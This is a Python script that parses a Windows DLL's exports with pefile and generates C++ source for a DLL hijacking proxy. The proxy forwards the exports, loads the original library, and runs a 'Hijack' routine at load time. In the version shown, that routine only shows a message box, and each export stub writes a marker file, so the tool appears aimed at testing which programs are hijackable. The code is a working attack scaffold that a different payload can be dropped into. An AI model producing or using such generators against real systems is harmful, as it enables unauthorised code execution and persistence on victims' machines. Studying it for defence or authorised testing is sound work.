#coding=utf-8
#dll call jump - ddh

import os,sys,time
import pefile

is64 = False

def main():
    pe = pefile.PE(sys.argv[1])
    exportTable = pe.DIRECTORY_ENTRY_EXPORT.symbols
    print("[!]Find export function :[ %d ]\r\n" % len(exportTable))
    for exptab in exportTable: 
        print("%3s %10s" % (exptab.ordinal, exptab.name))
    print("\r\n[+] generating DLL Hijack cpp file ...")
    
    generate(exportTable)
    
    print("\r\n[+] generating DLL Hijack cpp file has finished!")
    

def generate(exportTable):
    global is64
    segments = r"//Generate by DllHijackExportTest.py\
\
#include <Windows.h>\
\
DEFINE_DLL_EXPORT_FUNC\
#define EXTERNC extern \"C\"\
#define NAKED __declspec(naked)\
#define EXPORT __declspec(dllexport)\
#define ALCPP EXPORT NAKED\
#define ALSTD EXTERNC EXPORT NAKED void __stdcall\
#define ALCFAST EXTERNC EXPORT NAKED void __fastcall\
#define ALCDECL EXTERNC NAKED void __cdecl\
\
namespace DLLHijacker\
{\
    HMODULE m_hModule = NULL;\
    DWORD m_dwReturn[17] = {0};\
    inline BOOL WINAPI Load()\
    {\
        TCHAR tzPath[MAX_PATH];\
        lstrcpy(tzPath, TEXT(\"DLL_FILENAME.dll\"));\
        m_hModule = LoadLibrary(tzPath);\
        if (m_hModule == NULL)\
            return FALSE;\
        return (m_hModule != NULL);\
    }\
    inline VOID WINAPI Free()\
    {\
        if (m_hModule)\
            FreeLibrary(m_hModule);\
    }\
    FARPROC WINAPI GetAddress(PCSTR pszProcName)\
    {\
        FARPROC fpAddress;\
        CHAR szProcName[16];\
        fpAddress = GetProcAddress(m_hModule, pszProcName);\
        if (fpAddress == NULL)\
        {\
            if (HIWORD(pszProcName) == 0)\
            {\
                //wsprintf(szProcName, \"%d\", pszProcName);\
                //pszProcName = szProcName;\
            }\
            ExitProcess(-2);\
        }\
        return fpAddress;\
    }\
}\
using namespace DLLHijacker;\
VOID Hijack()\
{\
    MessageBoxW(NULL, L\"DLL Hijack!\", L\":)\", 0);\
}\
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)\
{\
    if (dwReason == DLL_PROCESS_ATTACH)\
    {\
        DisableThreadLibraryCalls(hModule);\
        if(Load())\
            Hijack();\
    }\
    else if (dwReason == DLL_PROCESS_DETACH)\
    {\
        Free();\
    }\
    return TRUE;\
}\
"
    
    filename = sys.argv[1].split("\\")[-1].split(".")[0]
    fp = open(filename + ".cpp", "w+")
    define_dll_exp_func = ""
    for exptable in exportTable:
        define_dll_exp_func += r"#pragma comment(linker, \"/EXPORT:" + exptable.name.decode()
        if is64:
            define_dll_exp_func += "=DLLHijacker_" + exptable.name.decode() + ",@"+ str(exptable.ordinal) +"\")\n"
        else:
            define_dll_exp_func += "=_DLLHijacker_" + exptable.name.decode() + ",@"+ str(exptable.ordinal) +"\")\n"
            
    segments = segments.replace('DLL_FILENAME', filename)
    segments = segments.replace("DEFINE_DLL_EXPORT_FUNC", define_dll_exp_func).replace('\\','')
    fp.writelines(segments)
    
    forward_dll_exp_func = ""
    for exptable in exportTable:
        if is64:
            forward_dll_exp_func += "EXTERNC EXPORT void DLLHijacker_"+ exptable.name.decode() +"(void)\n{"            
        else:
            forward_dll_exp_func += "ALCDECL DLLHijacker_"+ exptable.name.decode() +"(void)\n{"
            
        forward_dll_exp_func += "\n    CreateFileA(\"Hijack_%s_%s\", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);" % (filename, exptable.name.decode()) +\
                            "\n    //__asm POP m_dwReturn[0 * TYPE long];" + \
                            "\n    //GetAddress(\""+ exptable.name.decode() + "\")();"+ \
                            "\n    //__asm JMP m_dwReturn[0 * TYPE long];\n}\r\n"
    fp.writelines(forward_dll_exp_func)
    fp.close()
    
    

def usage():
    print("Usage:")
    print("    %s <dllpath> 32|64" % sys.argv[0])
    print("    %s c:\\windows\\system32\\msimg32.dll 64" % sys.argv[0])

if __name__ == "__main__":
    if(len(sys.argv) <3):
        usage()
    else:
        if sys.argv[2] == '64':
            is64 = True
        main()
